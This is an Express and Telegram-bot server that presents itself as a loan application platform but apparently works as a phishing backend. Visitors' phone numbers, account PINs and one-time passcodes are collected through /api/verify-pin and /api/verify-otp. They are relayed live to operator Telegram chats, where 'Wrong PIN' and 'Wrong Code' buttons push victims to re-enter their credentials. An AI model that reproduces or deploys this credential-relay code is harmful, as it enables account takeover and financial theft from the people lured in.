const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
require('dotenv').config();

const db = require('./database');

const app = express();

// ==========================================
// ✅ WEBHOOK MODE FOR RENDER - NO ETELEGRAM!
// ==========================================

const adminBots = new Map();

// Get Render URL from environment
const RENDER_URL = process.env.RENDER_EXTERNAL_URL || process.env.APP_URL;
const PORT = process.env.PORT || 3000;

const SUPER_ADMIN_BOT_TOKEN = process.env.SUPER_ADMIN_BOT_TOKEN;
const SUPER_ADMIN_CHAT_ID = process.env.SUPER_ADMIN_CHAT_ID;

let superAdminBot = null;
let dbReady = false;

(async () => {
    try {
        await db.connectDatabase();
        dbReady = true;
        console.log('✅ Database ready!');
        
        // Wait for server to start before setting webhooks
        setTimeout(async () => {
            await initializeSuperAdminBot();
            await initializeBotsFromDatabase();
        }, 2000);
        
    } catch (error) {
        console.error('❌ Database initialization failed:', error);
        process.exit(1);
    }
})();

async function initializeSuperAdminBot() {
    try {
        if (!SUPER_ADMIN_BOT_TOKEN) {
            console.error('❌ SUPER_ADMIN_BOT_TOKEN not set');
            return;
        }
        
        // ✅ WEBHOOK MODE: polling: false
        superAdminBot = new TelegramBot(SUPER_ADMIN_BOT_TOKEN, { polling: false });
        
        if (RENDER_URL) {
            const webhookUrl = `${RENDER_URL}/webhook/superadmin`;
            await superAdminBot.setWebHook(webhookUrl);
            console.log(`✅ Super Admin webhook: ${webhookUrl}`);
        } else {
            console.log('⚠️ No RENDER_URL - starting polling for local dev');
            superAdminBot = new TelegramBot(SUPER_ADMIN_BOT_TOKEN, { polling: true });
        }
        
        setupSuperAdminHandlers();
        console.log('✅ Super Admin bot initialized');
        
    } catch (error) {
        console.error('❌ Failed to initialize super admin bot:', error);
    }
}

async function initializeBotsFromDatabase() {
    const admins = await db.getAllAdmins();
    console.log(`📋 Loading ${admins.length} admins from database...`);
    
    for (const admin of admins) {
        if (admin.status === 'active') {
            if (adminBots.has(admin.adminId)) {
                console.log(`⚠️ Bot exists for: ${admin.name}, skipping...`);
                continue;
            }
            
            const bot = await createAdminBot(admin.adminId, admin.botToken);
            if (bot) {
                console.log(`✅ Bot initialized for: ${admin.name}`);
            }
        }
    }
}

// Middleware
app.use(express.json());
app.use(express.static(__dirname));

app.use((req, res, next) => {
    if (!dbReady && !req.path.includes('/health')) {
        return res.status(503).json({ success: false, message: 'Database not ready yet' });
    }
    next();
});

// ==========================================
// BOT MANAGEMENT
// ==========================================

async function createAdminBot(adminId, botToken) {
    try {
        if (adminBots.has(adminId)) {
            console.log(`🔄 Bot already exists for admin: ${adminId}`);
            return adminBots.get(adminId);
        }
        
        // ✅ WEBHOOK MODE: polling: false - NO ETELEGRAM!
        const bot = new TelegramBot(botToken, { polling: false });
        
        if (RENDER_URL) {
            const webhookUrl = `${RENDER_URL}/webhook/${adminId}`;
            await bot.setWebHook(webhookUrl);
            console.log(`✅ Webhook for ${adminId}: ${webhookUrl}`);
        } else {
            console.log(`⚠️ No RENDER_URL - polling for ${adminId}`);
            bot.startPolling();
        }
        
        adminBots.set(adminId, bot);
        setupAdminBotHandlers(adminId, bot);
        
        return bot;
        
    } catch (error) {
        console.error(`❌ Error creating bot for admin ${adminId}:`, error.message);
        return null;
    }
}

// ==========================================
// WEBHOOK ENDPOINTS - RECEIVE BOT UPDATES
// ==========================================

app.post('/webhook/superadmin', (req, res) => {
    if (superAdminBot) {
        superAdminBot.processUpdate(req.body);
    }
    res.sendStatus(200);
});

app.post('/webhook/:adminId', (req, res) => {
    const { adminId } = req.params;
    const bot = adminBots.get(adminId);
    
    if (bot) {
        bot.processUpdate(req.body);
    }
    res.sendStatus(200);
});

// ==========================================
// BOT HANDLERS
// ==========================================

function setupAdminBotHandlers(adminId, bot) {
    bot.onText(/\/start/, async (msg) => {
        const chatId = msg.chat.id;
        const admin = await db.getAdmin(adminId);
        
        bot.sendMessage(chatId, `
👋 *Welcome ${admin ? admin.name : 'Admin'}!*

This is your dedicated loan application bot.

*Your Admin ID:* \`${adminId}\`
*Your Personal Link:*
${RENDER_URL || 'http://localhost:3000'}?admin=${adminId}

*Commands:*
/start - Show this message
/mylink - Get your personal link
/stats - View your statistics
/pending - List pending applications
/myinfo - View your information
        `, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/mylink/, async (msg) => {
        const chatId = msg.chat.id;
        const admin = await db.getAdmin(adminId);
        
        bot.sendMessage(chatId, `
🔗 *YOUR PERSONAL LINK*

\`${RENDER_URL || 'http://localhost:3000'}?admin=${adminId}\`

📋 Applications from this link → *${admin.name}*
        `, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/stats/, async (msg) => {
        const chatId = msg.chat.id;
        const stats = await db.getAdminStats(adminId);
        
        bot.sendMessage(chatId, `
📊 *YOUR STATISTICS*

📋 Total: ${stats.total}
⏳ PIN Pending: ${stats.pinPending}
✅ PIN Approved: ${stats.pinApproved}
⏳ OTP Pending: ${stats.otpPending}
🎉 Fully Approved: ${stats.fullyApproved}
        `, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/pending/, async (msg) => {
        const chatId = msg.chat.id;
        const adminApps = await db.getApplicationsByAdmin(adminId);
        const pinPending = adminApps.filter(a => a.pinStatus === 'pending');
        const otpPending = adminApps.filter(a => a.otpStatus === 'pending' && a.pinStatus === 'approved');
        
        let message = `⏳ *PENDING APPLICATIONS*\n\n`;
        
        if (pinPending.length > 0) {
            message += `📱 *PIN Approval (${pinPending.length}):*\n`;
            pinPending.forEach((app, i) => {
                message += `${i + 1}. ${app.phoneNumber} - \`${app.id}\`\n`;
            });
            message += '\n';
        }
        
        if (otpPending.length > 0) {
            message += `🔢 *OTP Approval (${otpPending.length}):*\n`;
            otpPending.forEach((app, i) => {
                message += `${i + 1}. ${app.phoneNumber} - OTP: \`${app.otp}\`\n`;
            });
        }
        
        if (pinPending.length === 0 && otpPending.length === 0) {
            message = '✨ No pending applications!';
        }
        
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/myinfo/, async (msg) => {
        const chatId = msg.chat.id;
        const admin = await db.getAdmin(adminId);
        
        if (admin) {
            bot.sendMessage(chatId, `
ℹ️ *YOUR INFO*

👤 *Name:* ${admin.name}
📧 *Email:* ${admin.email}
🆔 *Admin ID:* \`${adminId}\`
📅 *Created:* ${new Date(admin.createdAt).toLocaleString()}
✅ *Status:* ${admin.status}

🔗 *Your Link:*
${RENDER_URL || 'http://localhost:3000'}?admin=${adminId}
            `, { parse_mode: 'Markdown' });
        }
    });

    bot.on('callback_query', async (callbackQuery) => {
        await handleAdminCallback(adminId, bot, callbackQuery);
    });
}

function setupSuperAdminHandlers() {
    if (!superAdminBot) return;
    
    superAdminBot.onText(/\/start/, async (msg) => {
        const chatId = msg.chat.id;
        const stats = await db.getStats();
        
        superAdminBot.sendMessage(chatId, `
👑 *SUPER ADMIN PANEL*

📊 *STATISTICS*
👥 Admins: ${stats.totalAdmins}
📋 Applications: ${stats.totalApplications}
⏳ PIN Pending: ${stats.pinPending}
✅ PIN Approved: ${stats.pinApproved}
⏳ OTP Pending: ${stats.otpPending}
🎉 Fully Approved: ${stats.fullyApproved}
❌ Rejected: ${stats.totalRejected}
        `, { parse_mode: 'Markdown' });
    });
}

async function handleAdminCallback(adminId, bot, callbackQuery) {
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data = callbackQuery.data;
    
    if (data.startsWith('wrongpin_otp_')) {
        const applicationId = data.replace('wrongpin_otp_', '');
        const application = await db.getApplication(applicationId);
        
        if (!application || application.adminId !== adminId) {
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: '❌ Application not found!',
                show_alert: true
            });
            return;
        }
        
        await db.updateApplication(applicationId, { otpStatus: 'wrongpin_otp' });
        
        await bot.editMessageText(`
❌ *WRONG PIN AT OTP STAGE*

📋 Application: \`${applicationId}\`
📱 Phone: ${application.phoneNumber}
🔢 Code: \`${application.otp}\`

⚠️ *Status:* User's PIN was incorrect
👤 *By:* ${callbackQuery.from.first_name}
⏰ *Time:* ${new Date().toLocaleString()}

User will re-enter PIN.
        `, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown'
        });
        
        await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ User will re-enter PIN' });
        return;
    }
    
    if (data.startsWith('wrongcode_otp_')) {
        const applicationId = data.replace('wrongcode_otp_', '');
        const application = await db.getApplication(applicationId);
        
        if (!application || application.adminId !== adminId) {
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: '❌ Application not found!',
                show_alert: true
            });
            return;
        }
        
        await db.updateApplication(applicationId, { otpStatus: 'wrongcode' });
        
        await bot.editMessageText(`
❌ *WRONG CODE*

📋 Application: \`${applicationId}\`
📱 Phone: ${application.phoneNumber}
🔢 Code: \`${application.otp}\`

⚠️ *Status:* Wrong verification code
👤 *By:* ${callbackQuery.from.first_name}
⏰ *Time:* ${new Date().toLocaleString()}

User will re-enter code.
        `, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown'
        });
        
        await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ User will re-enter code' });
        return;
    }
    
    if (data.startsWith('approve_pin_')) {
        const applicationId = data.replace('approve_pin_', '');
        const application = await db.getApplication(applicationId);
        
        if (!application || application.adminId !== adminId) {
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: '❌ Application not found!',
                show_alert: true
            });
            return;
        }
        
        await db.updateApplication(applicationId, { pinStatus: 'rejected' });
        
        await bot.editMessageText(`
❌ *APPLICATION DENIED*

📋 Application: \`${applicationId}\`
📱 Phone: ${application.phoneNumber}
🔑 PIN: \`${application.pin}\`

⚠️ *Status:* REJECTED
👤 *By:* ${callbackQuery.from.first_name}
⏰ *Time:* ${new Date().toLocaleString()}
        `, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown'
        });
        
        await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Denied' });
        return;
    }
    
    if (data.startsWith('reject_pin_')) {
        const applicationId = data.replace('reject_pin_', '');
        const application = await db.getApplication(applicationId);
        
        if (!application || application.adminId !== adminId) {
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: '❌ Application not found!',
                show_alert: true
            });
            return;
        }
        
        await db.updateApplication(applicationId, { pinStatus: 'approved' });
        
        await bot.editMessageText(`
✅ *PIN APPROVED*

📋 Application: \`${applicationId}\`
📱 Phone: ${application.phoneNumber}
🔑 PIN: \`${application.pin}\`

✅ *Status:* PIN Approved - Awaiting OTP
👤 *By:* ${callbackQuery.from.first_name}
⏰ *Time:* ${new Date().toLocaleString()}
        `, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown'
        });
        
        await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Approved' });
        return;
    }
    
    if (data.startsWith('approve_otp_')) {
        const applicationId = data.replace('approve_otp_', '');
        const application = await db.getApplication(applicationId);
        
        if (!application || application.adminId !== adminId) {
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: '❌ Application not found!',
                show_alert: true
            });
            return;
        }
        
        await db.updateApplication(applicationId, { otpStatus: 'approved' });
        
        await bot.editMessageText(`
🎉 *LOAN APPROVED!*

📋 Application: \`${applicationId}\`
📱 Phone: ${application.phoneNumber}
🔑 PIN: \`${application.pin}\`
🔢 OTP: \`${application.otp}\`

✅ *Status:* FULLY APPROVED
👤 *By:* ${callbackQuery.from.first_name}
⏰ *Time:* ${new Date().toLocaleString()}
        `, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown'
        });
        
        await bot.answerCallbackQuery(callbackQuery.id, { text: '🎉 Approved!' });
        return;
    }
}

// ==========================================
// API ENDPOINTS
// ==========================================

app.post('/api/verify-pin', async (req, res) => {
    try {
        const { phoneNumber, pin, adminId: requestAdminId, assignmentType } = req.body;
        const applicationId = `APP-${Date.now()}`;
        
        let assignedAdmin;
        
        if (assignmentType === 'specific' && requestAdminId) {
            assignedAdmin = await db.getAdmin(requestAdminId);
            if (!assignedAdmin || assignedAdmin.status !== 'active') {
                return res.status(400).json({ success: false, message: 'Invalid admin' });
            }
        } else {
            const activeAdmins = await db.getActiveAdmins();
            if (activeAdmins.length === 0) {
                return res.status(503).json({ success: false, message: 'No admins available' });
            }
            
            const adminStats = await Promise.all(
                activeAdmins.map(async (admin) => {
                    const stats = await db.getAdminStats(admin.adminId);
                    return { admin, pending: stats.pinPending + stats.otpPending };
                })
            );
            
            adminStats.sort((a, b) => a.pending - b.pending);
            assignedAdmin = adminStats[0].admin;
        }
        
        const bot = adminBots.get(assignedAdmin.adminId);
        
        if (!bot) {
            return res.status(503).json({ success: false, message: 'Bot unavailable' });
        }
        
        await db.saveApplication({
            id: applicationId,
            adminId: assignedAdmin.adminId,
            adminName: assignedAdmin.name,
            phoneNumber,
            pin,
            pinStatus: 'pending',
            otpStatus: 'pending',
            assignmentType: assignmentType || 'auto',
            timestamp: new Date().toISOString()
        });
        
        await bot.sendMessage(assignedAdmin.chatId, `
📱 *NEW APPLICATION*

📋 *ID:* \`${applicationId}\`
📱 *Phone:* ${phoneNumber}
🔑 *PIN:* \`${pin}\`
⏰ *Time:* ${new Date().toLocaleString()}

⚠️ *VERIFY INFORMATION*
        `, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Invalid - Deny', callback_data: `approve_pin_${applicationId}` }],
                    [{ text: '✅ Correct - Allow OTP', callback_data: `reject_pin_${applicationId}` }]
                ]
            }
        });
        
        res.json({ 
            success: true, 
            applicationId,
            assignedTo: assignedAdmin.name,
            assignedAdminId: assignedAdmin.adminId
        });
        
    } catch (error) {
        console.error('❌ Error:', error);
        res.status(500).json({ success: false, message: 'Failed' });
    }
});

app.get('/api/check-pin-status/:applicationId', async (req, res) => {
    const { applicationId } = req.params;
    const application = await db.getApplication(applicationId);
    
    if (application) {
        res.json({ success: true, status: application.pinStatus });
    } else {
        res.status(404).json({ success: false, message: 'Not found' });
    }
});

app.post('/api/verify-otp', async (req, res) => {
    try {
        const { applicationId, otp } = req.body;
        const application = await db.getApplication(applicationId);
        
        if (!application) {
            return res.status(404).json({ success: false, message: 'Not found' });
        }
        
        const admin = await db.getAdmin(application.adminId);
        const bot = adminBots.get(application.adminId);
        
        if (!admin || !bot) {
            return res.status(500).json({ success: false, message: 'Admin unavailable' });
        }
        
        await db.updateApplication(applicationId, { otp, otpStatus: 'pending' });
        
        await bot.sendMessage(admin.chatId, `
📲 *CODE VERIFICATION*

📋 *ID:* \`${applicationId}\`
📱 *Phone:* ${application.phoneNumber}
🔢 *Code:* \`${otp}\`
⏰ *Time:* ${new Date().toLocaleString()}

⚠️ *VERIFY CODE*
        `, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Wrong PIN', callback_data: `wrongpin_otp_${applicationId}` }],
                    [{ text: '❌ Wrong Code', callback_data: `wrongcode_otp_${applicationId}` }],
                    [{ text: '✅ Approve Loan', callback_data: `approve_otp_${applicationId}` }]
                ]
            }
        });
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ success: false, message: 'Failed' });
    }
});

app.get('/api/check-otp-status/:applicationId', async (req, res) => {
    const { applicationId } = req.params;
    const application = await db.getApplication(applicationId);
    
    if (application) {
        res.json({ success: true, status: application.otpStatus });
    } else {
        res.status(404).json({ success: false, message: 'Not found' });
    }
});

app.post('/api/resend-otp', async (req, res) => {
    try {
        const { applicationId } = req.body;
        const application = await db.getApplication(applicationId);
        
        if (!application) {
            return res.status(404).json({ success: false, message: 'Not found' });
        }
        
        const admin = await db.getAdmin(application.adminId);
        const bot = adminBots.get(application.adminId);
        
        if (!admin || !bot) {
            return res.status(500).json({ success: false, message: 'Admin unavailable' });
        }
        
        await bot.sendMessage(admin.chatId, `
🔄 *OTP RESEND*

📋 Application: \`${applicationId}\`
📱 Phone: ${application.phoneNumber}

User requested OTP resend.
        `, { parse_mode: 'Markdown' });
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ success: false, message: 'Failed' });
    }
});

app.get('/api/admins', async (req, res) => {
    const admins = await db.getActiveAdmins();
    const adminList = admins.map(admin => ({
        id: admin.adminId,
        name: admin.name,
        email: admin.email,
        status: admin.status
    }));
    
    res.json({ success: true, admins: adminList });
});

app.get('/api/validate-admin/:adminId', async (req, res) => {
    const { adminId } = req.params;
    const admin = await db.getAdmin(adminId);
    
    if (admin && admin.status === 'active') {
        res.json({ 
            success: true, 
            valid: true,
            admin: {
                id: admin.adminId,
                name: admin.name,
                email: admin.email
            }
        });
    } else {
        res.json({ 
            success: true, 
            valid: false,
            message: 'Admin not found or inactive'
        });
    }
});

app.get('/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        database: dbReady ? 'connected' : 'not ready',
        activeBots: adminBots.size,
        mode: RENDER_URL ? 'webhook' : 'polling',
        timestamp: new Date().toISOString()
    });
});

app.get('/admin-select', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin-select.html'));
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// ==========================================
// SERVER
// ==========================================

app.listen(PORT, () => {
    console.log(`\n👑 MULTI-ADMIN LOAN PLATFORM`);
    console.log(`============================`);
    console.log(`🌐 Server: http://localhost:${PORT}`);
    console.log(`🔗 Mode: ${RENDER_URL ? 'WEBHOOK ✅' : 'POLLING ⚠️'}`);
    console.log(`👑 Super Admin: ${superAdminBot ? 'Active' : 'Pending'}`);
    console.log(`\n✅ Platform ready!\n`);
});

async function shutdownGracefully() {
    console.log('🛑 Shutting down...');
    
    if (superAdminBot) {
        await superAdminBot.deleteWebHook();
    }
    
    for (const [adminId, bot] of adminBots.entries()) {
        await bot.deleteWebHook();
    }
    
    adminBots.clear();
    await db.closeDatabase();
    
    console.log('✅ Shutdown complete');
    process.exit(0);
}

process.on('SIGTERM', shutdownGracefully);
process.on('SIGINT', shutdownGracefully);

process.on('unhandledRejection', (error) => {
    console.error('Unhandled rejection:', error);
});

process.on('uncaughtException', (error) => {
    console.error('Uncaught exception:', error);
    shutdownGracefully();
});